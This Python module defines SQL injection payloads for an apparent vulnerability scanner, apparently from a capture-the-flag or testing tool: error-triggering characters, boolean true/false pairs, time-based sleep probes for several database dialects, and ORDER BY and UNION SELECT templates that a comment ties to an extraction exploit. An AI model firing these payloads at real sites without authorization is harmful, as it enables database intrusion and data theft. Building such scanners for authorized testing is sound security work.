"""SQL injection probes: error, boolean, time, and UNION building blocks."""
from __future__ import annotations

# Characters/suffixes likely to break a query and surface a DB error.
ERROR_PROBES = ["'", '"', "\\", "')", '")', "';", "'--", "`"]

# Boolean pairs appended to a parameter value: (TRUE variant, FALSE variant).
# A real injection makes TRUE look like the baseline and FALSE differ (or vice
# versa). The scanner compares response similarity, not fixed strings.
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' AND '1'='2"),
    (' AND 1=1', ' AND 1=2'),
    ('" AND "1"="1', '" AND "1"="2'),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("'-- -", "' AND 1=2-- -"),
]

# Time-based payloads. {s} = seconds. Multiple dialects; the scanner measures
# the response delay against a baseline.
TIME_PROBES = [
    "' OR SLEEP({s})-- -",
    "'; SELECT SLEEP({s})-- -",
    "' OR pg_sleep({s})-- -",
    "'; SELECT pg_sleep({s})-- -",
    "' OR 1=1; WAITFOR DELAY '0:0:{s}'-- -",
    "1) OR SLEEP({s})-- -",
]

# UNION column-count probes (ORDER BY) used by the extraction exploit.
ORDER_BY = "' ORDER BY {n}-- -"

# UNION SELECT template; {cols} is a comma-separated marker list.
UNION = "' UNION SELECT {cols}-- -"


def union_markers(n: int, marker: str) -> list[str]:
    """Build n column expressions, each a quoted marker like 'WCTF1a2b'."""
    return [f"'{marker}{i}'" for i in range(n)]
